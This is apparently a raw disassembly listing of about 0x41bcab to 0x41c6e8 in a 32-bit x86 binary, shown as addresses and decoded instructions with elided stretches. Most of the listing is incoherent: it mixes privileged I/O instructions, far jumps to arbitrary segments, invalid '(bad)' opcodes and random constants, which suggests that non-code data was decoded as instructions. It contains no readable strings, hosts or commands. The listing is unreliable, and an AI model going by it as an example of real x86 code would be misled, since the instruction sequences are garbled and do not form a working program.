  41bcab:	repnz dec edx
  41bcad:	jb     0x41bcb9
  41bcaf:	rcl    BYTE PTR [ecx+esi*2+0x52593067],1
  41bcb6:	dec    ebx
  41bcb7:	pop    esi
  41bcb8:	stc    
  41bcb9:	xor    eax,0xc44ea87d
  41bcbe:	fwait
  41bcbf:	sahf   
  41bcc0:	popf   
  41bcc1:	jl     0x41bd13
  41bcc3:	push   esp
  41bcc4:	xlat   BYTE PTR ds:[ebx]
  41bcc5:	pop    ecx
  41bcc6:	pop    ss
  41bcc7:	mov    ebx,0x162caa76
  41bccc:	lahf   
  41bccd:	ficomp WORD PTR [ebx]
  41bccf:	mov    al,ds:0x5db262c0
  41bcd4:	popa   
  41bcd5:	push   ss
  41bcd6:	add    dl,bl
  41bcd8:	into   
  41bcd9:	sahf   
  41bcda:	lea    esp,[edx+0x5b]
  41bcdd:	jo     0x41bc7c
  41bcdf:	jns    0x41bd42
  41bce1:	jp     0x41bcfa
  41bce3:	leave  
  41bce4:	daa    
  41bce5:	std    
  41bce6:	mov    bh,0x4a
  41bce8:	adc    dl,BYTE PTR [edi+0x39]
  41bceb:	stos   DWORD PTR es:[edi],eax
  41bcec:	ja     0x41bc74
	...
  41bd56:	shl    BYTE PTR [edx],cl
  41bd58:	cli    
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0x658d9d8
  41bd64:	cmp    al,0xfb
  41bd66:	sub    eax,DWORD PTR [bx+di]
  41bd69:	add    BYTE PTR [eax],al
  41bd6b:	add    DWORD PTR [eax],eax
  41bd6d:	add    BYTE PTR [edx-0x18],bh
  41bd70:	sbb    BYTE PTR [edx],bl
  41bd72:	pop    ss
  41bd73:	cli    
  41bd74:	inc    edi
  41bd75:	(bad)  
  41bd76:	out    dx,eax
  41bd77:	data16 ss out dx,al
  41bd7a:	fidivr DWORD PTR [ebx-0x66]
  41bd7d:	es dec ebp
  41bd7f:	pop    ebx
  41bd80:	arpl   WORD PTR [esi+0x37],dx
  41bd83:	pop    ebp
  41bd84:	std    
  41bd85:	mov    eax,0xd3ace104
  41bd8a:	add    BYTE PTR [ebp-0x7bb5be53],0x87
  41bd91:	inc    esi
  41bd92:	and    BYTE PTR [edx+ecx*1+0x46],ch
  41bd96:	jo     0x41bd3e
  41bd98:	dec    edi
  41bd99:	pop    edx
  41bd9a:	add    DWORD PTR [ebx],ecx
  41bd9c:	inc    eax
  41bd9d:	leave  
  41bd9e:	mov    ch,0x13
  41bda0:	cmp    al,0xcd
  41bda2:	mov    ch,0x7c
  41bda4:	lahf   
  41bda5:	sbb    BYTE PTR [eax+0x7cc5dd31],0xa3
  41bdac:	outs   dx,DWORD PTR ds:[esi]
  41bdad:	push   es
  41bdae:	mov    BYTE PTR [esi+0x5efa18a0],bh
  41bdb4:	cwde   
  41bdb5:	iret   
  41bdb6:	jmp    0x41bdc1
  41bdb8:	sbb    al,0x32
  41bdba:	lock cdq 
  41bdbc:	or     eax,0x85ad37e7
  41bdc1:	mov    cl,BYTE PTR [edx+0x3c]
  41bdc4:	in     eax,dx
  41bdc5:	popa   
  41bdc6:	pop    esi
  41bdc7:	xor    BYTE PTR [edi+0xd],dh
  41bdca:	add    ecx,DWORD PTR [ebx]
  41bdcc:	and    BYTE PTR [edx+ebp*2+0x61],dl
  41bdd0:	inc    esp
  41bdd1:	mov    al,0xba
  41bdd3:	or     BYTE PTR [eax],cl
  41bdd5:	sub    BYTE PTR [ebp-0x38a5c059],dh
  41bddb:	jg     0x41bdcd
  41bddd:	enter  0x85e8,0x7d
  41bde1:	sub    ecx,edx
  41bde3:	sti    
  41bde4:	retf   
  41bde5:	and    DWORD PTR cs:[ecx+0x7ad21ff4],eax
  41bdec:	sbb    DWORD PTR [edx-0x38c45c1a],ebx
  41bdf2:	mov    ds:0x81e48e3f,eax
  41bdf7:	(bad)  
  41bdf8:	sbb    BYTE PTR [ebp-0x22],cl
  41bdfb:	inc    ecx
  41bdfc:	adc    ecx,ecx
  41bdfe:	add    al,0x5d
  41be00:	js     0x41be18
  41be02:	or     bh,BYTE PTR [ebx+0x3f5b5d75]
  41be08:	into   
  41be09:	push   esp
  41be0a:	push   edx
  41be0b:	sub    BYTE PTR [edx],0x82
  41be0e:	pusha  
  41be0f:	xlat   BYTE PTR ds:[ebx]
  41be10:	sbb    dh,bl
  41be12:	mov    ah,0x12
  41be14:	adc    cl,BYTE PTR [ebx]
  41be16:	clc    
  41be17:	add    DWORD PTR [esi-0x578f612],edx
  41be1d:	sbb    BYTE PTR [esi+0x3e],bl
  41be20:	test   BYTE PTR [ebp-0x38],dh
  41be23:	hlt    
  41be24:	xchg   esp,eax
  41be25:	fdivr  DWORD PTR [esi-0x73]
  41be28:	jne    0x41be7e
  41be2a:	in     eax,dx
  41be2b:	fwait
  41be2c:	sbb    esp,DWORD PTR [ebx]
  41be2e:	and    al,0x4a
  41be30:	push   esp
  41be31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be32:	aas    
  41be33:	xor    dl,bh
  41be35:	mov    dh,0x36
  41be37:	push   ss
  41be38:	sbb    eax,0xdcc973ca
  41be3d:	int3   
  41be3e:	push   esp
  41be3f:	adc    BYTE PTR fs:[ebp-0x4a097cb0],bl
  41be46:	es in  eax,dx
  41be48:	mov    DWORD PTR [ebx-0x7f12f34a],esi
  41be4e:	jle    0x41bdda
  41be50:	push   edi
  41be51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be52:	scas   eax,DWORD PTR es:[edi]
  41be53:	sbb    eax,0xb8bba67b
  41be58:	mov    esp,0x1a4b7ef
  41be5d:	mov    esi,0x8e01325c
  41be62:	data16 cmp BYTE PTR [ecx-0x1f],bl
  41be66:	pop    edx
  41be67:	test   al,0xb5
  41be69:	push   eax
  41be6a:	inc    ecx
  41be6b:	mov    bl,0xec
  41be6d:	out    0x0,al
	...
  41bed3:	add    BYTE PTR [eax],al
  41bed5:	add    BYTE PTR [ebp-0x63956373],al
  41bedb:	jnp    0x41bed4
  41bedd:	out    dx,eax
  41bede:	mov    ebp,DWORD PTR [ecx-0x733bc09a]
  41bee4:	and    dl,ah
  41bee6:	addr16 sub al,0x1
  41bee9:	add    BYTE PTR [eax],al
  41beeb:	add    DWORD PTR [eax],eax
  41beed:	add    BYTE PTR ds:0xd188bb00,al
  41bef3:	les    ebx,FWORD PTR [esi]
  41bef5:	cmp    eax,0xcf8ea2a1
  41befa:	adc    bh,BYTE PTR [edx-0x22f31025]
  41bf00:	push   ds
  41bf01:	outs   dx,DWORD PTR ds:[esi]
  41bf02:	push   0xffffff95
  41bf04:	mov    eax,ds:0x35b0ec5b
  41bf09:	ficom  WORD PTR [esi+0x893c179]
  41bf0f:	sub    BYTE PTR [edx+edi*2-0x4bb1b27e],dl
  41bf16:	ss pop esp
  41bf18:	repnz lods al,BYTE PTR ds:[esi]
  41bf1a:	mov    al,0xa1
  41bf1c:	mov    ss,WORD PTR [ebx]
  41bf1e:	xor    BYTE PTR [ecx+0x51],dh
  41bf21:	jbe    0x41bf75
  41bf23:	aam    0x2e
  41bf25:	test   eax,0x46884868
  41bf2a:	and    DWORD PTR [ebx],0xbb5f0ec9
  41bf30:	sub    dl,cl
  41bf32:	push   0x3c
  41bf34:	adc    eax,0x21b28b4f
  41bf39:	sahf   
  41bf3a:	mov    ebp,0xbb194325
  41bf3f:	or     al,0x43
  41bf41:	js     0x41bfb5
  41bf43:	sub    eax,0xe08ba0c2
  41bf48:	hlt    
  41bf49:	leave  
  41bf4a:	mov    bh,0xf3
  41bf4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf4d:	ins    BYTE PTR es:[edi],dx
  41bf4e:	cmp    BYTE PTR [eax-0x2f97a739],0x1b
  41bf55:	lea    esp,[eax]
  41bf57:	jmp    0x4bef:0x298f651e
  41bf5e:	xor    ebx,DWORD PTR [ecx+0x32]
  41bf61:	add    BYTE PTR [edx+0x4b03de48],0x92
  41bf68:	jge    0x41bfc3
  41bf6a:	lods   al,BYTE PTR ds:[esi]
  41bf6b:	mov    edi,edi
  41bf6d:	stos   DWORD PTR es:[edi],eax
  41bf6e:	scas   al,BYTE PTR es:[edi]
  41bf6f:	stc    
  41bf70:	retf   
  41bf71:	jb     0x41bfce
  41bf73:	sub    dl,0x70
  41bf76:	jmp    FWORD PTR [ebx-0x79980805]
  41bf7c:	pop    ebp
  41bf7d:	sahf   
  41bf7e:	stc    
  41bf7f:	mov    bh,0x16
  41bf81:	shr    DWORD PTR [edi+esi*8],cl
  41bf84:	hlt    
  41bf85:	cmc    
  41bf86:	cmp    cl,BYTE PTR [eax]
  41bf88:	out    0x86,al
  41bf8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf8b:	addr16 jb 0x41bf98
  41bf8e:	hlt    
  41bf8f:	hlt    
  41bf90:	cwde   
  41bf91:	or     DWORD PTR [ecx-0x503aee6f],0xc557aa8
  41bf9b:	ins    BYTE PTR es:[edi],dx
  41bf9c:	xchg   ebp,eax
  41bf9d:	nop
  41bf9e:	retf   0x2331
  41bfa1:	(bad)  
  41bfa2:	loope  0x41bff5
  41bfa4:	(bad)  
  41bfa5:	iret   
  41bfa6:	outs   dx,DWORD PTR ds:[esi]
  41bfa7:	mov    bh,0x76
  41bfa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfaa:	xor    BYTE PTR [eax-0x4b032e92],al
  41bfb0:	jl     0x41bfe5
  41bfb2:	or     DWORD PTR [edx+0x27],esp
  41bfb5:	jle    0x41bf99
  41bfb7:	xchg   esp,eax
  41bfb8:	sar    BYTE PTR [eax+0x6f562d78],cl
  41bfbe:	sar    DWORD PTR [ebx+esi*1+0x78],0x6d
  41bfc3:	mov    BYTE PTR [edx+0x63],dh
  41bfc6:	inc    ecx
  41bfc7:	stos   DWORD PTR es:[edi],eax
  41bfc8:	test   eax,0x1eecbd47
  41bfcd:	fdivr  st,st(6)
  41bfcf:	mov    al,ds:0xf307ec11
  41bfd4:	mov    edx,0x6fad380f
  41bfd9:	outs   dx,BYTE PTR ds:[esi]
  41bfda:	inc    ebp
  41bfdb:	lahf   
  41bfdc:	or     BYTE PTR ds:0x4bb978eb,0xe1
  41bfe3:	out    0x4c,eax
  41bfe5:	js     0x41bf68
  41bfe7:	add    eax,0xab586ec8
  41bfec:	inc    ebp
  41bfed:	jb     0x41bfef
	...
  41c053:	add    BYTE PTR [eax],al
  41c055:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	test   DWORD PTR [ebp+0x2d67994a],0x1000001
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	adc    DWORD PTR [edx-0x3428ec5d],0x47
  41c075:	imul   ebx,DWORD PTR [ebx+0x7709a493],0x70333a1b
  41c07f:	fwait
  41c080:	sahf   
  41c081:	xchg   ebx,eax
  41c082:	aaa    
  41c083:	les    ebx,FWORD PTR [ebx+eax*4+0x7c75c512]
  41c08a:	nop
  41c08b:	mov    edi,0x2ed26e5a
  41c090:	mov    eax,ds:0xddcd5cfe
  41c095:	imul   BYTE PTR [eax+0x4ba0e040]
  41c09b:	cmp    al,0xa5
  41c09d:	ja     0x41c07a
  41c09f:	ret    
  41c0a0:	or     BYTE PTR [eax-0x48359fc2],dl
  41c0a6:	leave  
  41c0a7:	aam    0xe
  41c0a9:	pop    es
  41c0aa:	xchg   ebp,eax
  41c0ab:	sbb    eax,0xc2779182
  41c0b0:	jmp    0x34ff:0x64f67016
  41c0b7:	aam    0xcc
  41c0b9:	cmp    al,0x49
  41c0bb:	inc    ecx
  41c0bc:	test   BYTE PTR [esi+0x68495bb7],dl
  41c0c2:	imul   esi,DWORD PTR [ebp+0x4364af76],0xb67ab1ae
  41c0cc:	daa    
  41c0cd:	or     ch,BYTE PTR ds:0xe0410179
  41c0d3:	imul   edi,DWORD PTR [ebx-0x40],0x44
  41c0d7:	stc    
  41c0d8:	fld    QWORD PTR [edi-0x2a1eacea]
  41c0de:	pop    es
  41c0df:	and    eax,0xf58cc9ae
  41c0e4:	xchg   edx,eax
  41c0e5:	leave  
  41c0e6:	pop    ebx
  41c0e8:	mov    esi,ebp
  41c0ea:	test   BYTE PTR fs:[esi+0x603320c7],bh
  41c0f1:	pop    esp
  41c0f2:	cmc    
  41c0f3:	xor    eax,0x999e13a3
  41c0f8:	sub    ebx,DWORD PTR ds:[esi+0x70]
  41c0fc:	dec    eax
  41c0fd:	add    BYTE PTR [ebp-0x46735d],bl
  41c103:	cmp    DWORD PTR [edx-0x52],eax
  41c106:	mov    DWORD PTR [edx-0x1b],edi
  41c109:	jle    0x41c16e
  41c10b:	pop    edi
  41c10c:	xchg   edx,eax
  41c10d:	push   ebx
  41c10e:	add    DWORD PTR [eax+0x30ed25a0],ebp
  41c114:	xchg   BYTE PTR [ebx+0x5d],bh
  41c117:	and    esi,edi
  41c119:	inc    eax
  41c11a:	pop    ecx
  41c11b:	pop    esp
  41c11c:	adc    eax,0x8572e2f5
  41c121:	in     eax,0x4b
  41c123:	dec    esp
  41c124:	mov    eax,0x23574778
  41c129:	mov    eax,ds:0xe2df25f7
  41c12e:	bound  ecx,QWORD PTR [ecx]
  41c130:	pushf  
  41c131:	inc    ecx
  41c132:	jl     0x41c0e5
  41c134:	dec    esi
  41c135:	test   eax,0x6f267ba2
  41c13a:	lahf   
  41c13b:	jg     0x41c0cc
  41c13d:	pop    esp
  41c13e:	ret    
  41c13f:	push   0x9aca05f6
  41c144:	out    0xab,eax
  41c146:	pop    esi
  41c147:	dec    eax
  41c148:	test   BYTE PTR [edi-0x47955fdc],dh
  41c14e:	test   al,0x2a
  41c150:	shl    ah,1
  41c152:	sub    eax,eax
  41c154:	or     edi,DWORD PTR [ebp-0x65]
  41c157:	mov    dh,0x68
  41c159:	icebp  
  41c15a:	and    ah,0x70
  41c15d:	fadd   st(0),st
  41c15f:	and    BYTE PTR [ecx-0x74],0xef
  41c163:	xor    BYTE PTR [esi-0x12d10d5c],0x42
  41c16a:	clc    
  41c16b:	sbb    ah,bh
  41c16d:	xchg   DWORD PTR [eax],eax
	...
  41c1d3:	add    BYTE PTR [eax],al
  41c1d5:	add    cl,bl
  41c1d7:	dec    edx
  41c1d8:	mov    eax,ds:0xd9fbb3f8
  41c1dd:	imul   edi,DWORD PTR ds:0x74e90501,0xffffffe6
  41c1e4:	push   ds
  41c1e5:	jmp    0x100:0x12e67
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	sub    al,0xff
  41c1f0:	out    dx,eax
  41c1f1:	sbb    BYTE PTR [edi+ebp*8+0x12],ch
  41c1f5:	jecxz  0x41c250
  41c1f7:	adc    edi,ecx
  41c1f9:	out    dx,eax
  41c1fa:	cmp    eax,0x8182d41f
  41c1ff:	jge    0x41c274
  41c201:	repz cmp eax,0x9fd4257c
  41c207:	mov    bl,0x77
  41c209:	in     al,0x70
  41c20b:	int    0x6e
  41c20d:	int3   
  41c20e:	dec    edi
  41c20f:	inc    BYTE PTR [edi]
  41c211:	xchg   esp,eax
  41c212:	in     al,dx
  41c213:	daa    
  41c214:	imul   ecx,DWORD PTR [esp+eax*1-0x400c8f66],0x1e1fc251
  41c21f:	push   0x9dbf4803
  41c224:	je     0x41c256
  41c226:	inc    edx
  41c227:	mov    ch,0x30
  41c229:	pop    edx
  41c22a:	ror    DWORD PTR [esi-0x468ff6a6],0xad
  41c231:	sti    
  41c232:	jmp    0x41c1d7
  41c234:	mov    al,0xbf
  41c236:	xchg   edx,eax
  41c237:	sbb    eax,0x29f37a4b
  41c23c:	pop    eax
  41c23d:	lock lds ecx,FWORD PTR [esi+0x28]
  41c241:	push   es
  41c242:	sub    cl,dh
  41c244:	(bad)  
  41c245:	repnz outs dx,BYTE PTR ds:[esi]
  41c247:	mov    esi,0x5251e05b
  41c24c:	js     0x41c22b
  41c24e:	jmp    0xed0:0xe8394671
  41c255:	push   ds
  41c256:	stos   BYTE PTR es:[edi],al
  41c257:	pusha  
  41c258:	pop    ebp
  41c259:	(bad)  
  41c25a:	int    0xa1
  41c25c:	scas   eax,DWORD PTR es:[edi]
  41c25d:	call   0xf57c013c
  41c262:	inc    edx
  41c263:	mov    al,ds:0xb53b0187
  41c268:	sahf   
  41c269:	push   0xbb427992
  41c26e:	mov    esp,0x136749aa
  41c273:	jns    0x41c20a
  41c275:	int3   
  41c276:	cmc    
  41c277:	gs sub al,0xd3
  41c27a:	or     BYTE PTR [eax+0x4a],ch
  41c27d:	(bad)  [eax+edi*4+0x7a]
  41c281:	push   ds
  41c282:	daa    
  41c283:	mov    al,ds:0xb5d8728f
  41c288:	mov    dh,BYTE PTR [esi+0x2f8bbb56]
  41c28e:	fwait
  41c28f:	mov    ebp,0x6dcffc3e
  41c294:	jo     0x41c27a
  41c296:	push   ecx
  41c297:	ds test edi,edi
  41c29a:	adc    bh,BYTE PTR [esi-0x27]
  41c29d:	jle    0x41c2e8
  41c29f:	dec    edi
  41c2a0:	inc    di
  41c2a2:	sub    eax,0xb1e11709
  41c2a7:	jns    0x41c242
  41c2a9:	repnz ins BYTE PTR es:[edi],dx
  41c2ab:	xchg   edi,eax
  41c2ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2ad:	cmp    DWORD PTR [ebx+0x7d49d38c],0x4f
  41c2b4:	cmp    DWORD PTR [ecx],esi
  41c2b6:	sahf   
  41c2b7:	scas   al,BYTE PTR es:[edi]
  41c2b8:	daa    
  41c2b9:	push   ss
  41c2ba:	jno    0x41c2d1
  41c2bc:	jge    0x41c295
  41c2be:	dec    edx
  41c2bf:	xor    BYTE PTR [edx],bh
  41c2c1:	mov    ds:0xc5310700,eax
  41c2c6:	int3   
  41c2c7:	ret    0x4845
  41c2ca:	scas   al,BYTE PTR es:[edi]
  41c2cb:	push   ebx
  41c2cc:	adc    ebp,ecx
  41c2ce:	mov    cl,0x7
  41c2d0:	push   cs
  41c2d1:	shl    DWORD PTR [eax-0x10d6a5af],1
  41c2d7:	push   es
  41c2d8:	out    dx,eax
  41c2d9:	push   ecx
  41c2da:	js     0x41c2d2
  41c2dc:	popa   
  41c2dd:	scas   al,BYTE PTR es:[edi]
  41c2de:	xchg   esi,eax
  41c2df:	loope  0x41c2ea
  41c2e1:	test   al,0x21
  41c2e3:	pushf  
  41c2e4:	cmp    ebp,DWORD PTR es:[edi]
  41c2e7:	div    cl
  41c2e9:	inc    edi
  41c2ea:	dec    ebp
  41c2eb:	shr    bl,cl
  41c2ed:	daa    
	...
  41c356:	repz and ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	or     ah,BYTE PTR [esi]
  41c364:	add    DWORD PTR [ebx+0x67],ecx
  41c367:	das    
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	add    BYTE PTR [ecx],al
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	call   0x91a0864
  41c373:	sub    bl,dh
  41c375:	sub    esi,DWORD PTR [ebx-0x7f]
  41c378:	xchg   esp,eax
  41c379:	mov    ch,0x13
  41c37b:	dec    eax
  41c37c:	or     ebp,edx
  41c37e:	push   0x7432f322
  41c383:	cmp    al,0xcb
  41c385:	mov    eax,ds:0x2fabd036
  41c38a:	out    dx,eax
  41c38b:	push   edi
  41c38c:	adc    cl,BYTE PTR [edi-0x5d0adc94]
  41c392:	or     ebp,ebp
  41c394:	call   FWORD PTR [esp+edi*2-0x4]
  41c398:	push   edx
  41c399:	icebp  
  41c39a:	aaa    
  41c39b:	mov    WORD PTR [ecx+0x6c961350],ds
  41c3a1:	das    
  41c3a2:	jmp    0x41c423
  41c3a4:	lahf   
  41c3a5:	push   cs
  41c3a6:	bound  ebp,QWORD PTR [ebp-0x76]
  41c3a9:	or     al,cl
  41c3ab:	add    al,0x90
  41c3ad:	in     al,dx
  41c3ae:	addr16 xchg edx,eax
  41c3b0:	(bad)  [edi]
  41c3b2:	ins    DWORD PTR es:[edi],dx
  41c3b3:	sub    BYTE PTR [ebx+0x57004b90],0x5b
  41c3ba:	pop    esp
  41c3bb:	(bad)  
  41c3bc:	pop    ebp
  41c3bd:	mov    eax,0x3c4415da
  41c3c2:	stos   BYTE PTR es:[edi],al
  41c3c3:	mov    ds:0x60743e27,al
  41c3c8:	push   ecx
  41c3c9:	jg     0x41c3a1
  41c3cb:	inc    ebp
  41c3cc:	aam    0x21
  41c3ce:	inc    edi
  41c3cf:	push   ds
  41c3d0:	iret   
  41c3d1:	dec    BYTE PTR [esp+edx*8]
  41c3d4:	adc    edx,eax
  41c3d6:	mov    es,WORD PTR [ecx-0x50afef4a]
  41c3dc:	dec    edi
  41c3dd:	not    BYTE PTR [ebx]
  41c3df:	xchg   edi,eax
  41c3e0:	into   
  41c3e1:	jmp    0x5d14:0x9360667d
  41c3e8:	cmc    
  41c3e9:	add    DWORD PTR [esi+0x62],ecx
  41c3ec:	push   esp
  41c3ed:	cmp    bh,BYTE PTR [eax]
  41c3ef:	ror    BYTE PTR [edx+eiz*8+0x5be10778],1
  41c3f6:	push   esi
  41c3f7:	add    dl,BYTE PTR [ecx]
  41c3f9:	jge    0x41c451
  41c3fb:	test   BYTE PTR [ebx-0x43db942e],ah
  41c401:	sets   BYTE PTR [ecx-0x2135c146]
  41c408:	or     BYTE PTR [edi+0x61],ch
  41c40b:	mov    dh,0x78
  41c40d:	pop    esi
  41c40e:	aad    0xec
  41c410:	xchg   ebp,eax
  41c411:	mov    ah,0xe7
  41c413:	adc    edx,esp
  41c415:	mov    eax,ds:0x60577501
  41c41a:	adc    edx,esp
  41c41c:	sub    BYTE PTR [ebx+0x28ac4bff],0x10
  41c423:	or     al,BYTE PTR [edx+0x2027346e]
  41c429:	push   esp
  41c42a:	mov    ebp,0xb633feab
  41c42f:	adc    BYTE PTR [eax+0x20830a70],0x73
  41c436:	adc    ecx,ecx
  41c438:	sar    BYTE PTR ds:0x19b0a756,1
  41c43e:	aam    0x5c
  41c440:	out    dx,al
  41c441:	dec    edx
  41c442:	xchg   ebx,eax
  41c443:	std    
  41c444:	jge    0x41c426
  41c446:	dec    edi
  41c447:	fcomp  QWORD PTR [eax-0x4f4d6b18]
  41c44d:	stos   BYTE PTR es:[edi],al
  41c44e:	push   ss
  41c44f:	pop    edi
  41c450:	adc    BYTE PTR [ecx+eax*1],0x61
  41c454:	cmp    al,0xa6
  41c457:	and    al,0xff
  41c459:	test   eax,0xbf8f8dfe
  41c45e:	jnp    0x41c47f
  41c460:	frstor [ebx-0xa69b68e]
  41c466:	cmp    ah,al
  41c468:	dec    ebx
  41c469:	mov    ds:0xb6e24f12,al
	...
  41c4d6:	push   ebx
  41c4d7:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	dec    ebp
  41c4e3:	mov    al,0x2a
  41c4e5:	or     BYTE PTR [edi+0x30],ah
  41c4e8:	add    DWORD PTR [eax],eax
  41c4ea:	add    BYTE PTR [ecx],al
  41c4ec:	add    BYTE PTR [eax],al
  41c4ee:	xchg   ebp,eax
  41c4ef:	sbb    esi,DWORD PTR [ebp+0x3d6d008a]
  41c4f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4f6:	pop    esp
  41c4f7:	pop    edx
  41c4f8:	ds iret 
  41c4fa:	sbb    DWORD PTR [eax+ebx*2+0x587cfc88],eax
  41c501:	stos   BYTE PTR es:[edi],al
  41c502:	fadd   QWORD PTR ds:0x64a32dde
  41c508:	inc    edx
  41c509:	cwde   
  41c50a:	and    edx,DWORD PTR [eax-0x38d54c3e]
  41c510:	enter  0xf09a,0x89
  41c514:	imul   eax,DWORD PTR [ebx+0x566118a],0xd848fce0
  41c51e:	xlat   BYTE PTR ds:[ebx]
  41c51f:	lahf   
  41c520:	jns    0x41c519
  41c522:	cmp    al,BYTE PTR [ebp+0x8243df6]
  41c528:	adc    dl,BYTE PTR [eax]
  41c52a:	pusha  
  41c52b:	mov    bh,0x66
  41c52d:	inc    ebp
  41c52e:	push   ebx
  41c52f:	dec    edi
  41c530:	not    BYTE PTR [ebp+0x2d]
  41c533:	sti    
  41c534:	jmp    0x85ab:0x7dfaae2d
  41c53b:	jge    0x41c587
  41c53d:	push   edi
  41c53e:	stos   DWORD PTR es:[edi],eax
  41c53f:	lods   al,BYTE PTR ds:[esi]
  41c540:	nop
  41c541:	hlt    
  41c542:	jg     0x41c50f
  41c544:	popa   
  41c545:	aas    
  41c546:	sbb    al,0x8
  41c548:	jo     0x41c4e8
  41c54a:	imul   esp,edx,0x98297369
  41c550:	push   0x55a102a7
  41c555:	mov    dl,0xba
  41c558:	ds hlt 
  41c55a:	push   ebp
  41c55b:	xor    bh,BYTE PTR [edx-0x7155919f]
  41c561:	(bad)  
  41c562:	mov    ds:0xdd0fbaf8,eax
  41c567:	nop
  41c568:	aad    0xbc
  41c56a:	xchg   ebx,eax
  41c56b:	mov    ecx,0x547b9768
  41c570:	pop    edi
  41c571:	jmp    0xdb5b:0xcb674d7b
  41c578:	pop    edi
  41c579:	jg     0x41c593
  41c57b:	daa    
  41c57c:	jp     0x41c5aa
  41c57e:	push   cs
  41c57f:	jge    0x41c56e
  41c581:	(bad)  
  41c582:	pop    ds
  41c583:	cs nop
  41c585:	mov    eax,0x2e2684e7
  41c58a:	cmp    DWORD PTR [edi+0x4d],ecx
  41c58d:	push   ds
  41c58e:	outs   dx,BYTE PTR ds:[esi]
  41c58f:	adc    DWORD PTR [esi+eax*8+0x617b4a8e],edi
  41c596:	gs jecxz 0x41c5cb
  41c599:	or     al,0x1d
  41c59b:	jo     0x41c53d
  41c59d:	adc    eax,0x39009bde
  41c5a2:	cld    
  41c5a3:	ja     0x41c5e1
  41c5a5:	ins    DWORD PTR es:[edi],dx
  41c5a6:	shl    BYTE PTR [eax],cl
  41c5a8:	mov    ecx,0x9ebb10bb
  41c5ad:	sbb    eax,0xc6df5079
  41c5b2:	(bad)  
  41c5b3:	fmul   QWORD PTR [eax+eax*1+0x4f13e628]
  41c5ba:	dec    edx
  41c5bb:	popa   
  41c5bc:	aas    
  41c5bd:	(bad)  
  41c5be:	repz adc eax,0x8f13a2ea
  41c5c4:	aas    
  41c5c5:	push   0x6d
  41c5c7:	loopne 0x41c5ce
  41c5c9:	sbb    esp,0x35
  41c5cc:	imul   esi,ebx,0x6c
  41c5cf:	ss jne 0x41c55d
  41c5d2:	les    ebx,FWORD PTR [eax+0x73a602a2]
  41c5d8:	xchg   esi,eax
  41c5d9:	pop    eax
  41c5da:	push   edx
  41c5db:	stos   DWORD PTR es:[edi],eax
  41c5dc:	push   ebp
  41c5dd:	push   esi
  41c5de:	imul   eax,DWORD PTR ds:0x6326b1dc,0xffffffa9
  41c5e5:	jge    0x41c589
  41c5e7:	aaa    
  41c5e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5e9:	dec    esp
  41c5ea:	cld    
  41c5eb:	push   ds
  41c5ec:	scas   eax,DWORD PTR es:[edi]
  41c5ed:	adc    BYTE PTR [eax],al
	...
  41c653:	add    BYTE PTR [eax],al
  41c655:	add    ch,al
  41c657:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c65d:	jecxz  0x41c6a2
  41c65f:	and    ch,ch
  41c661:	call   0x3167:0x82d080a4
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	add    BYTE PTR [ecx],al
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	lea    ebx,[ebx-0x6efc8ab1]
  41c674:	dec    BYTE PTR [eax-0x3b7e9100]
  41c67a:	adc    ecx,DWORD PTR [edi]
  41c67c:	add    al,0xd9
  41c67e:	imul   ecx,DWORD PTR [ebp-0x357dff25],0xffffff8a
  41c685:	mov    edx,0xcd48082f
  41c68a:	inc    eax
  41c68b:	pop    es
  41c68c:	jmp    0xf631:0x5621b5c8
  41c693:	xor    ebp,ecx
  41c695:	mov    esp,0xeac49228
  41c69a:	jecxz  0x41c65c
  41c69c:	inc    edi
  41c69d:	xchg   esi,eax
  41c69e:	repz cmp edi,edx
  41c6a1:	add    ebp,DWORD PTR [esi]
  41c6a3:	xlat   BYTE PTR ds:[ebx]
  41c6a4:	in     eax,0x91
  41c6a6:	retf   0x5fd1
  41c6a9:	scas   eax,DWORD PTR es:[edi]
  41c6aa:	xor    cl,BYTE PTR [eax+edx*1-0xe756b5f]
  41c6b1:	in     al,dx
  41c6b2:	test   BYTE PTR [edx-0x1ed2f5],ah
  41c6b8:	dec    eax
  41c6b9:	push   ds
  41c6ba:	in     al,dx
  41c6bb:	mov    al,0xe2
  41c6bd:	add    edx,esi
  41c6bf:	(bad)  
  41c6c0:	pop    esi
  41c6c1:	xor    eax,0xe1542fc8
  41c6c6:	push   eax
  41c6c7:	or     dl,cl
  41c6c9:	rcr    BYTE PTR [edi+edi*1+0x47],1
  41c6cd:	sub    esi,DWORD PTR [edx-0x227ac0a6]
  41c6d3:	push   0x367291f6
  41c6d8:	mov    ebx,0x2ca09a6
  41c6dd:	retf   0x1e66
  41c6e0:	js     0x41c6b3
  41c6e2:	push   ebx
  41c6e3:	xchg   ebp,eax
  41c6e4:	push   ss
  41c6e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6e6:	jge    0x41c722
  41c6e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
